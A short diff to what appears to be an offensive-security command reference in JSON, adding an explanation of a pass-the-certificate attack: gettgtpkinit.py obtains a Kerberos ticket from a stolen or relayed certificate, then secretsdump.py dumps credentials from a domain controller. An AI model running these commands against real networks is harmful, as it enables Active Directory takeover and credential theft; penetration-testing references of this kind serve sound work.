@@ -110,5 +110,6 @@
       "label": "Use it",
       "command": "export KRB5CCNAME=tgt.ccache; secretsdump.py -k -no-pass <domain>/<user>@<dc_fqdn>"
     }
-  ]
+  ],
+  "explain": "Requests a Kerberos TGT via PKINIT using a certificate (pass-the-certificate):\n  gettgtpkinit.py          PKINITtools TGT requester\n  -cert-pfx <pfx_file>     the certificate (from ADCS relay or shadow credentials)\n  -pfx-pass '<pfx_pass>'   the PFX password\n  -dc-ip <dc_ip>           the DC to authenticate to\n  <domain>/<user>          the principal the cert authenticates as\n  <ccache>                 output ccache file\nExport KRB5CCNAME to that ccache, then run secretsdump/services as the cert's owner."
 }
